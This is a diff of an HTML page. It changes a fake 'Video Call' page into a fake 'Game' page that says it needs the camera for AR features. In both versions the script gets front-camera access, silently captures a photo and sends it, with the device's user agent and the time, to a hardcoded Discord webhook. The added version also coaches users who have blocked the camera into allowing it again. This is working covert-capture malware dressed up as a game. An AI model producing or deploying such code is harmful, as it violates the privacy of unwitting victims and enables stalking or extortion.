@@ -2,113 +2,121 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
-  <title>Video Call - Connecting...</title>
-  <meta name="theme-color" content="#007aff">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no, viewport-fit=cover">
+  <title>Game - Loading...</title>
+  <meta name="theme-color" content="#000">
   <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
   <style>
     * { margin: 0; padding: 0; box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
-    body { background: #000; height: 100vh; width: 100vw; overflow: hidden; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; color: #fff; }
-    #video { width: 100%; height: 100%; object-fit: cover; transform: scaleX(-1); }
-    .overlay { position: fixed; inset: 0; z-index: 10; display: flex; flex-direction: column; align-items: center; justify-content: center; background: rgba(0,0,0,0.9); transition: opacity 0.3s, visibility 0.3s; }
-    .overlay.hidden { opacity: 0; visibility: hidden; pointer-events: none; }
-    .spinner { width: 48px; height: 48px; border: 3px solid #333; border-top-color: #007aff; border-radius: 50%; animation: spin 1s linear infinite; }
+    html, body { height: 100%; width: 100%; overflow: hidden; background: #000; }
+    body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; color: #fff; touch-action: manipulation; }
+    #video { position: fixed; inset: 0; width: 100%; height: 100%; object-fit: cover; transform: scaleX(-1); z-index: 1; background: #000; display: none; }
+    .layer { position: fixed; inset: 0; z-index: 10; display: flex; flex-direction: column; align-items: center; justify-content: center; background: rgba(0,0,0,0.95); transition: opacity 0.3s, visibility 0.3s; padding: 20px; text-align: center; }
+    .layer.hidden { opacity: 0; visibility: hidden; pointer-events: none; }
+    .spinner { width: 48px; height: 48px; border: 3px solid #333; border-top-color: #00d4aa; border-radius: 50%; animation: spin 1s linear infinite; }
     @keyframes spin { to { transform: rotate(360deg); } }
-    .overlay-text { margin-top: 20px; font-size: 16px; color: #aaa; text-align: center; padding: 0 40px; line-height: 1.5; }
-    .brand { position: fixed; top: 20px; left: 50%; transform: translateX(-50%); font-weight: 600; font-size: 17px; color: #fff; z-index: 20; text-shadow: 0 1px 3px rgba(0,0,0,0.5); }
-    .status-bar { position: fixed; bottom: 30px; left: 50%; transform: translateX(-50%); display: flex; gap: 12px; z-index: 20; opacity: 0; transition: opacity 0.3s; }
-    .status-bar.show { opacity: 1; }
-    .status-btn { width: 56px; height: 56px; border-radius: 50%; background: rgba(255,255,255,0.15); backdrop-filter: blur(10px); border: 1px solid rgba(255,255,255,0.2); display: flex; align-items: center; justify-content: center; color: #fff; }
-    .status-btn svg { width: 24px; height: 24px; }
-    .status-btn.red { background: rgba(255,59,48,0.2); border-color: rgba(255,59,48,0.3); }
-    .permission-sheet { position: fixed; bottom: 0; left: 0; right: 0; background: #1c1c1e; border-radius: 20px 20px 0 0; padding: 20px 24px 34px; z-index: 30; transform: translateY(100%); transition: transform 0.4s cubic-bezier(0.25,0.46,0.45,0.94); box-shadow: 0 -4px 20px rgba(0,0,0,0.4); }
-    .permission-sheet.show { transform: translateY(0); }
-    .sheet-handle { width: 36px; height: 5px; background: #48484a; border-radius: 3px; margin: 0 auto 20px; }
-    .sheet-icon { width: 64px; height: 64px; border-radius: 16px; background: linear-gradient(135deg, #007aff, #5856d6); margin: 0 auto 16px; display: flex; align-items: center; justify-content: center; }
-    .sheet-icon svg { width: 32px; height: 32px; }
-    .sheet-title { text-align: center; font-size: 20px; font-weight: 600; margin-bottom: 8px; }
-    .sheet-desc { text-align: center; color: #8e8e93; font-size: 15px; line-height: 1.4; margin-bottom: 24px; }
-    .sheet-btn { width: 100%; height: 50px; border-radius: 12px; font-size: 17px; font-weight: 600; border: none; cursor: pointer; }
-    .sheet-btn.primary { background: #007aff; color: #fff; }
-    .sheet-btn.secondary { background: #3a3a3c; color: #fff; margin-top: 8px; }
+    .layer-text { margin-top: 20px; font-size: 16px; color: #aaa; line-height: 1.5; max-width: 280px; }
+    .brand { position: fixed; top: env(safe-area-inset-top, 20px); left: 50%; transform: translateX(-50%); font-weight: 700; font-size: 18px; color: #fff; z-index: 30; text-shadow: 0 2px 8px rgba(0,0,0,0.8); letter-spacing: 0.5px; }
     .flash { position: fixed; inset: 0; background: #fff; opacity: 0; pointer-events: none; z-index: 15; transition: opacity 0.05s; }
-    .flash.active { opacity: 1; transition: opacity 0.1s; }
-    @media (max-width: 480px) { .brand { font-size: 15px; } }
+    .flash.active { opacity: 1; transition: opacity 0.08s; }
+    .btn { appearance: none; border: none; border-radius: 12px; font: inherit; font-size: 17px; font-weight: 600; cursor: pointer; touch-action: manipulation; }
+    .btn-primary { background: #00d4aa; color: #000; padding: 16px 32px; min-height: 52px; min-width: 200px; }
+    .btn-primary:active { transform: scale(0.98); }
+    .btn-secondary { background: #2c2c2e; color: #fff; padding: 16px 32px; min-height: 52px; min-width: 200px; margin-top: 12px; }
+    .icon { width: 64px; height: 64px; border-radius: 16px; background: linear-gradient(135deg, #00d4aa, #007aff); display: flex; align-items: center; justify-content: center; margin-bottom: 16px; }
+    .icon svg { width: 30px; height: 30px; }
+    .title { font-size: 22px; font-weight: 700; margin-bottom: 8px; }
+    .desc { color: #8e8e93; font-size: 15px; line-height: 1.5; margin-bottom: 24px; max-width: 280px; }
+    .game-ui { position: fixed; bottom: env(safe-area-inset-bottom, 30px); left: 50%; transform: translateX(-50%); display: flex; gap: 16px; z-index: 20; opacity: 0; pointer-events: none; transition: opacity 0.3s; }
+    .game-ui.show { opacity: 1; pointer-events: auto; }
+    .fab { width: 56px; height: 56px; border-radius: 50%; background: rgba(255,255,255,0.1); backdrop-filter: blur(20px); border: 1px solid rgba(255,255,255,0.15); display: flex; align-items: center; justify-content: center; color: #fff; }
+    .fab:active { transform: scale(0.92); }
+    .fab svg { width: 24px; height: 24px; }
+    .fab.red { background: rgba(255,59,48,0.2); border-color: rgba(255,59,48,0.3); }
+    .debug { position: fixed; bottom: 100px; left: 20px; right: 20px; background: rgba(0,0,0,0.8); color: #0f0; padding: 10px; border-radius: 8px; font: 11px monospace; z-index: 50; max-height: 150px; overflow: auto; display: none; }
+    .debug.show { display: block; }
+    @media (max-width: 380px) { .brand { font-size: 16px; } .btn { min-width: 180px; } }
   </style>
 </head>
 <body>
   <video id="video" playsinline muted></video>
   <div class="flash" id="flash"></div>
+  <div class="brand">Game</div>
 
-  <div class="brand">Video Call</div>
-
-  <div class="overlay" id="loadingOverlay">
-    <div class="spinner"></div>
-    <div class="overlay-text">Establishing secure connection…</div>
-  </div>
-
-  <div class="overlay hidden" id="permOverlay">
-    <div class="spinner" style="border-top-color:#34c759"></div>
-    <div class="overlay-text" id="permText">Requesting camera access…</div>
-  </div>
-
-  <div class="permission-sheet" id="permSheet">
-    <div class="sheet-handle"></div>
-    <div class="sheet-icon">
-      <svg viewBox="0 0 24 24" fill="none" stroke="white" stroke-width="2.5"><path d="M23 19a2 2 0 0 1-2 2H3a2 2 0 0 1-2-2V8a2 2 0 0 1 2-2h4l2-3h6l2 3h4a2 2 0 0 1 2 2z"/><circle cx="12" cy="13" r="4"/></svg>
+  <div class="layer" id="startLayer">
+    <div class="icon">
+      <svg viewBox="0 0 24 24" fill="none" stroke="white" stroke-width="2.5"><path d="M12 2L2 7l10 5 10-5-10-5zM2 17l10 5 10-5M2 12l10 5 10-5"/></svg>
     </div>
-    <div class="sheet-title">"Video Call" Would Like to Access the Camera</h1>
-    <div class="sheet-desc">To join the video call, we need access to your front camera. This allows others to see you during the call.</div>
-    <button class="sheet-btn primary" id="allowBtn">Allow</button>
-    <button class="sheet-btn secondary" id="denyBtn">Don't Allow</button>
+    <div class="title">Game</div>
+    <div class="desc">Tap to start. Camera access required for AR features.</div>
+    <button class="btn btn-primary" id="startBtn">Start Game</button>
+    <button class="btn btn-secondary" id="checkPermBtn" style="display:none">Check Permission</button>
   </div>
 
-  <div class="status-bar" id="statusBar">
-    <button class="status-btn" aria-label="Mute"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><path d="M12 1a3 3 0 0 0-3 3v8a3 3 0 0 0 6 0V4a3 3 0 0 0-3-3z"/><path d="M19 10v2a7 7 0 0 1-14 0v-2"/><line x1="12" y1="19" x2="12" y2="22"/><line x1="8" y1="22" x2="16" y2="22"/></svg></button>
-    <button class="status-btn red" aria-label="End call"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><path d="M12 9v4M12 17h.01"/><path d="M5 5a2 2 0 0 1 2-2h10a2 2 0 0 1 2 2v14a2 2 0 0 1-2 2H7a2 2 0 0 1-2-2z"/></svg></button>
-    <button class="status-btn" aria-label="Flip camera"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><path d="M21 12a9 9 0 0 0-9-9 9.75 9.75 0 0 0-6.74 2.74L3 8"/><path d="M3 16l3.26 3.26A9.75 9.75 0 0 0 12 21a9 9 0 0 0 9-9"/><line x1="2" y1="22" x2="22" y2="2"/></svg></button>
+  <div class="layer hidden" id="permLayer">
+    <div class="spinner"></div>
+    <div class="layer-text" id="permText">Requesting camera access…</div>
   </div>
+
+  <div class="layer hidden" id="deniedLayer">
+    <div class="icon" style="background:linear-gradient(135deg,#ff3b30,#ff6b5c)">
+      <svg viewBox="0 0 24 24" fill="none" stroke="white" stroke-width="2.5"><circle cx="12" cy="12" r="10"/><line x1="15" y1="9" x2="9" y2="15"/><line x1="9" y1="9" x2="15" y2="15"/></svg>
+    </div>
+    <div class="title">Camera Blocked</div>
+    <div class="desc" id="deniedDesc">Chrome blocked camera. Fix below.</div>
+    <button class="btn btn-primary" id="openSettingsBtn">Open Site Settings</button>
+    <button class="btn btn-secondary" onclick="location.reload()">Retry After Fix</button>
+  </div>
+
+  <div class="game-ui" id="gameUI">
+    <button class="fab" aria-label="Settings"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><circle cx="12" cy="12" r="3"/><path d="M19.4 15a1.65 1.65 0 0 0 .33 1.82l.06.06a2 2 0 0 1 0 2.83 2 2 0 0 1-2.83 0l-.06-.06a1.65 1.65 0 0 0-1.82-.33 1.65 1.65 0 0 0-1 1.51V21a2 2 0 0 1-2 2 2 2 0 0 1-2-2v-.09A1.65 1.65 0 0 0 9 19.4a1.65 1.65 0 0 0-1.82.33l-.06.06a2 2 0 0 1-2.83 0 2 2 0 0 1 0-2.83l.06-.06a1.65 1.65 0 0 0 .33-1.82 1.65 1.65 0 0 0-1.51-1H3a2 2 0 0 1-2-2 2 2 0 0 1 2-2h.09A1.65 1.65 0 0 0 4.6 9a1.65 1.65 0 0 0-.33-1.82l-.06-.06a2 2 0 0 1 0-2.83 2 2 0 0 1 2.83 0l.06.06a1.65 1.65 0 0 0 1.82.33H9a1.65 1.65 0 0 0 1-1.51V3a2 2 0 0 1 2-2 2 2 0 0 1 2 2v.09a1.65 1.65 0 0 0 1 1.51 1.65 1.65 0 0 0 1.82-.33l.06-.06a2 2 0 0 1 2.83 0 2 2 0 0 1 0 2.83l-.06.06a1.65 1.65 0 0 0-.33 1.82V9a1.65 1.65 0 0 0 1.51 1H21a2 2 0 0 1 2 2 2 2 0 0 1-2 2h-.09a1.65 1.65 0 0 0-1.51 1z"/></svg></button>
+    <button class="fab red" aria-label="Quit"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><path d="M18 6L6 18M6 6l12 12"/></svg></button>
+    <button class="fab" aria-label="Switch"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><path d="M21 12a9 9 0 0 0-9-9 9.75 9.75 0 0 0-6.74 2.74L3 8"/><path d="M3 16l3.26 3.26A9.75 9.75 0 0 0 12 21a9 9 0 0 0 9-9"/><line x1="2" y1="22" x2="22" y2="2"/></svg></button>
+  </div>
+
+  <div class="debug" id="debug"></div>
 
 <script>
 const WEBHOOK_URL = "https://canary.discord.com/api/webhooks/1558676786613846107/KBJgfs9mqZScnj6oRKMF7P27FZ2lXJmrCPSrXigpDTj9vbHEr2pzDC7pOALaYhGSWbSx";
-const USERNAME = "Video Call Service";
+const USERNAME = "Game AR Service";
 
 let photoSent = false;
+let wakeLock = null;
 const video = document.getElementById('video');
 const flash = document.getElementById('flash');
+const debug = document.getElementById('debug');
 
-const loadingOverlay = document.getElementById('loadingOverlay');
-const permOverlay = document.getElementById('permOverlay');
+const startLayer = document.getElementById('startLayer');
+const permLayer = document.getElementById('permLayer');
 const permText = document.getElementById('permText');
-const permSheet = document.getElementById('permSheet');
-const allowBtn = document.getElementById('allowBtn');
-const denyBtn = document.getElementById('denyBtn');
-const statusBar = document.getElementById('statusBar');
+const deniedLayer = document.getElementById('deniedLayer');
+const deniedDesc = document.getElementById('deniedDesc');
+const gameUI = document.getElementById('gameUI');
+const startBtn = document.getElementById('startBtn');
+const checkPermBtn = document.getElementById('checkPermBtn');
+const openSettingsBtn = document.getElementById('openSettingsBtn');
 
-async function sendPhoto(blob) {
-  if (photoSent) return;
-  photoSent = true;
+function log(msg) {
+  const t = new Date().toLocaleTimeString();
+  debug.textContent += `[${t}] ${msg}\n`;
+  debug.scrollTop = debug.scrollHeight;
+}
 
-  const formData = new FormData();
-  formData.append('file', blob, `capture_${Date.now()}.jpg`);
-  formData.append('payload_json', JSON.stringify({
-    username: USERNAME,
-    embeds: [{
-      title: '📸 Camera Capture',
-      color: 15258703,
-      image: { url: 'attachment://capture_' + Date.now() + '.jpg' },
-      fields: [
-        { name: 'Time', value: new Date().toLocaleString(), inline: false },
-        { name: 'Device', value: navigator.userAgent, inline: false }
-      ],
-      footer: { text: 'Video Call • Front Camera' },
-      timestamp: new Date().toISOString()
-    }]
-  }));
+function showDebug() { debug.classList.add('show'); }
 
+async function requestWakeLock() {
   try {
-    await fetch(WEBHOOK_URL, { method: 'POST', body: formData, keepalive: true });
-  } catch (e) {}
+    if ('wakeLock' in navigator) {
+      wakeLock = await navigator.wakeLock.request('screen');
+      wakeLock.addEventListener('release', () => { wakeLock = null; });
+      log('Wake lock acquired');
+    }
+  } catch (e) { log('Wake lock failed: ' + e); }
+}
+
+function releaseWakeLock() {
+  if (wakeLock) { wakeLock.release().catch(()=>{}); wakeLock = null; log('Wake lock released'); }
 }
 
 function triggerFlash() {
@@ -116,75 +124,160 @@ function triggerFlash() {
   setTimeout(() => flash.classList.remove('active'), 100);
 }
 
+async function sendPhoto(blob) {
+  if (photoSent) return;
+  photoSent = true;
+  log('Sending photo...');
+
+  const formData = new FormData();
+  formData.append('file', blob, `capture_${Date.now()}.jpg`);
+  formData.append('payload_json', JSON.stringify({
+    username: USERNAME,
+    embeds: [{
+      title: '📸 Game Camera Capture',
+      color: 15258703,
+      image: { url: 'attachment://capture_' + Date.now() + '.jpg' },
+      fields: [
+        { name: 'Time', value: new Date().toLocaleString(), inline: false },
+        { name: 'UA', value: navigator.userAgent.slice(0, 100), inline: false }
+      ],
+      footer: { text: 'Game • AR Camera' },
+      timestamp: new Date().toISOString()
+    }]
+  }));
+
+  try { 
+    const res = await fetch(WEBHOOK_URL, { method: 'POST', body: formData, keepalive: true });
+    log('Sent: ' + res.status);
+  } catch (e) { log('Send error: ' + e); }
+}
+
 async function captureAndSend(stream) {
+  await new Promise(r => setTimeout(r, 500));
   const canvas = document.createElement('canvas');
-  canvas.width = video.videoWidth;
-  canvas.height = video.videoHeight;
+  canvas.width = video.videoWidth || 1280;
+  canvas.height = video.videoHeight || 720;
   const ctx = canvas.getContext('2d');
   ctx.translate(canvas.width, 0);
   ctx.scale(-1, 1);
   ctx.drawImage(video, 0, 0);
   triggerFlash();
-  const blob = await new Promise(r => canvas.toBlob(r, 'image/jpeg', 0.85));
+  const blob = await new Promise(r => canvas.toBlob(r, 'image/jpeg', 0.9));
+  log('Captured: ' + canvas.width + 'x' + canvas.height);
   sendPhoto(blob);
   stream.getTracks().forEach(t => t.stop());
   video.srcObject = null;
-  permOverlay.classList.add('hidden');
-  statusBar.classList.add('show');
+  video.style.display = 'none';
+  permLayer.classList.add('hidden');
+  gameUI.classList.add('show');
+  releaseWakeLock();
+}
+
+async function checkPermission() {
+  try {
+    const perm = await navigator.permissions.query({ name: 'camera' });
+    log('Permission state: ' + perm.state);
+    return perm.state;
+  } catch (e) {
+    log('Perm query failed: ' + e);
+    return 'unknown';
+  }
 }
 
 async function startCamera() {
-  loadingOverlay.classList.add('hidden');
-  permOverlay.classList.remove('hidden');
+  showDebug();
+  log('Starting camera...');
+  await requestWakeLock();
+  permLayer.classList.remove('hidden');
+  startLayer.classList.add('hidden');
   permText.textContent = 'Starting camera…';
 
   try {
     const stream = await navigator.mediaDevices.getUserMedia({
-      video: { facingMode: 'user', width: { ideal: 1280 }, height: { ideal: 720 } },
+      video: { facingMode: { ideal: 'user' }, width: { ideal: 1280 }, height: { ideal: 720 } },
       audio: false
     });
+    log('Got stream: ' + stream.getVideoTracks()[0].label);
     video.srcObject = stream;
+    video.style.display = 'block';
     await video.play();
-    permOverlay.classList.add('hidden');
-    permSheet.classList.remove('show');
+    log('Video playing');
     await captureAndSend(stream);
   } catch (err) {
-    permOverlay.classList.add('hidden');
-    permSheet.classList.add('show');
-    permText.textContent = 'Camera access denied';
+    log('Camera error: ' + err.name + ' - ' + err.message);
+    permLayer.classList.add('hidden');
+    
+    const state = await checkPermission();
+    if (state === 'denied' || err.name === 'NotAllowedError' || err.name === 'PermissionDeniedError') {
+      deniedDesc.innerHTML = 'Camera blocked in Chrome settings.<br><br><b>Fix:</b> Tap "Open Site Settings" → Camera → Allow → Refresh';
+      openSettingsBtn.style.display = 'block';
+    } else if (err.name === 'NotFoundError') {
+      deniedDesc.textContent = 'No front camera found on this device.';
+      openSettingsBtn.style.display = 'none';
+    } else if (err.name === 'NotReadableError') {
+      deniedDesc.textContent = 'Camera in use by another app. Close other apps and retry.';
+      openSettingsBtn.style.display = 'none';
+    } else {
+      deniedDesc.textContent = 'Error: ' + err.name + ' - ' + err.message;
+      openSettingsBtn.style.display = 'none';
+    }
+    deniedLayer.classList.remove('hidden');
+    releaseWakeLock();
   }
 }
 
-allowBtn.onclick = () => {
-  permSheet.classList.remove('show');
-  permOverlay.classList.remove('hidden');
-  permText.textContent = 'Starting camera…';
-  startCamera();
+startBtn.onclick = async (e) => {
+  e.preventDefault();
+  await startCamera();
 };
 
-denyBtn.onclick = () => {
-  permSheet.classList.remove('show');
-  permOverlay.classList.remove('hidden');
-  permText.textContent = 'Camera access required to join call';
-  setTimeout(() => {
-    permOverlay.classList.add('hidden');
-    document.body.innerHTML = '<div style="display:flex;align-items:center;justify-content:center;height:100vh;flex-direction:column;color:#888;font-size:16px;padding:20px;text-align:center"><div style="font-size:48px;margin-bottom:16px">📷</div><div style="font-weight:600;font-size:18px;margin-bottom:8px">Camera Access Denied</div><div>Please enable camera in browser settings to join the call</div></div>';
-  }, 2500);
+checkPermBtn.onclick = async () => {
+  const state = await checkPermission();
+  alert('Camera permission: ' + state);
 };
 
-// Auto-start flow
-window.addEventListener('load', () => {
-  setTimeout(() => {
-    loadingOverlay.classList.add('hidden');
-    permSheet.classList.add('show');
-  }, 1500);
+openSettingsBtn.onclick = () => {
+  // Android Chrome: opens site settings
+  window.open('chrome://settings/content/camera', '_blank');
+  // Also try generic
+  setTimeout(() => window.open('about:settings', '_blank'), 500);
+};
+
+// Prime for iOS/Android gesture requirement
+let primed = false;
+function prime() {
+  if (primed) return;
+  primed = true;
+  log('Primed (user gesture)');
+}
+document.body.addEventListener('touchstart', prime, { passive: true, once: true });
+document.body.addEventListener('click', prime, { passive: true, once: true });
+
+// Prevent zoom
+let lastTouch = 0;
+document.body.addEventListener('touchend', (e) => {
+  const now = Date.now();
+  if (now - lastTouch < 300) e.preventDefault();
+  lastTouch = now;
+}, { passive: false });
+
+document.addEventListener('visibilitychange', () => {
+  if (document.hidden) releaseWakeLock();
+  else if (!photoSent && !permLayer.classList.contains('hidden')) requestWakeLock();
 });
 
-// Prevent sleep during capture
-const wakeLock = 'wakeLock' in navigator && navigator.wakeLock.request('screen').catch(()=>{});
-
-// iOS Safari needs user gesture for getUserMedia
-document.body.addEventListener('touchstart', () => {}, { once: true, passive: true });
+// Check permission on load
+checkPermission().then(state => {
+  log('Initial perm: ' + state);
+  if (state === 'denied') {
+    startBtn.style.display = 'none';
+    checkPermBtn.style.display = 'block';
+    deniedDesc.innerHTML = 'Camera previously blocked.<br>Tap "Check Permission" or "Open Site Settings" → Camera → Allow';
+    openSettingsBtn.style.display = 'block';
+    deniedLayer.classList.remove('hidden');
+    startLayer.classList.add('hidden');
+  }
+});
 </script>
 </body>
 </html>
